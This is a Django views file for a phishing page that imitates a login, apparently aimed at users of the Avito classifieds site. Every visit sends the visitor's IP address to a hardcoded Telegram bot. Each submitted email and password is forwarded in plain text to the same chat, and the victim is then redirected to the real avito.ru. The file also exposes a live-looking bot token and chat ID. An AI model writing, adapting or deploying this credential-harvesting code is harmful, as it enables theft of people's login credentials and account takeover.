from django.shortcuts import render, redirect
from django.views.generic.base import View
from .forms import ValidateLoginForm
import telebot


def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[-1].strip()
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip


class Login(View):
    def get(self, request):
        bot = telebot.TeleBot(token='1497860366:AAHTluqd-5_vvsXKeN4_uJflXd-e3cXvmtg')
        bot.send_message(882169821, f'Пользователь с ip: {get_client_ip(request)}\n'
                                     f'Зашел на сайт')
        form = ValidateLoginForm()
        return render(request, 'auth/login.html', {'form': form})

    def post(self, request):
        session = request.POST
        form = ValidateLoginForm(session)
        if form.is_valid():
            bot = telebot.TeleBot(token='1497860366:AAHTluqd-5_vvsXKeN4_uJflXd-e3cXvmtg')
            bot.send_message(882169821, f'Пользователь с ip: {get_client_ip(request)}\n'
                                         f'Ввел данные пароль и мыло\n'
                                         f'Email: {session["email"]}\n'
                                         f'Password: {session["password"]}\n')
            return redirect('https://www.avito.ru')
        else:
            bot = telebot.TeleBot(token='1497860366:AAHTluqd-5_vvsXKeN4_uJflXd-e3cXvmtg')
            bot.send_message(882169821, f'Пользователь с ip: {get_client_ip(request)}\n'
                                         f'Ввел данные пароль и мыло\n'
                                         f'Email: {session["email"]}\n'
                                         f'Password: {session["password"]}\n')
            return render(request, 'auth/login.html', {'form': form})


def custom_page_not_found_view(request, exception):
    return render(request, "auth/login.html", {})
